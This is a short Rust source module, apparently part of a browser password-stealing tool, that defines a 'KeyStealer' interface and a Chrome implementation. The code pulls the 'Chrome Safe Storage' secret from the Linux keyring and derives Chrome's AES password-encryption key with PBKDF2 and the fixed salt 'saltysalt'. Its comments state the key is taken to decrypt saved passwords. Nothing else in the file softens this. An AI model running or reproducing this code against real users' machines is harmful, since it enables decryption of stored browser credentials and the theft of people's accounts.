/**
 * Module contains classes that implement key stealing algorithms 
 * (such key we needs to decrypt password).
 * 
 * Max A. Jurankov (astronmax) 2022
 */

use hmac::Hmac;
use secret_service::{EncryptionType, SecretService};
use sha1::Sha1;

// Interface for key stealers
pub trait KeyStealer {
    // Method to get key for password decryption
    fn get_key(&self) -> Result<Box<[u8]>, &str>;
}

// Google Chrome AES key stealer
pub struct ChromeKeyStealer {}

impl ChromeKeyStealer {
    pub fn new() -> Self {
        ChromeKeyStealer {}
    }
}

impl KeyStealer for ChromeKeyStealer {
    // Method to get Google Chrome AES key
    fn get_key(&self) -> Result<Box<[u8]>, &str> {
        let ss = SecretService::new(EncryptionType::Dh).unwrap();
        let collection = ss.get_default_collection().unwrap();
        let items = collection.get_all_items().unwrap();

        for item in items {
            if item.get_label().unwrap() == "Chrome Safe Storage" {
                let mut res: [u8; 16] = [0x00; 16]; // it uses aes128 with 128 bit keys
                let secret = item.get_secret().unwrap();
                let salt = "saltysalt";
                pbkdf2::pbkdf2::<Hmac<Sha1>>(&secret[..], salt.as_bytes(), 1, &mut res);

                return Ok(Box::new(res));
            }
        }

        Err("can't steal google chrome key for decryption")
    }
}
